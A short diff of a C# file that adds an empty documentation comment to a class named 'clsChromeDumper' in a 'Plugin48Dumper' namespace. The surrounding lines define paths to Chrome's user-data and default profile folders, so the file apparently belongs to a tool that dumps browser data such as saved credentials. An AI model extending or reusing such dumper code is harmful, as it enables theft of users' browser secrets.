@@ -26,6 +26,10 @@ namespace Plugin48Dumper
 {
     public class clsChromeDumper : clsDumper
     {
+        /// <summary>
+        /// 
+        /// </summary>
+
         private string ChromeDir { get { return Path.Combine(ApplicationData, "Google"); } }
         private string UserDataFile { get { return Path.Combine(LocalApplicationData, "Google", "Chrome", "User Data"); } }
         private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
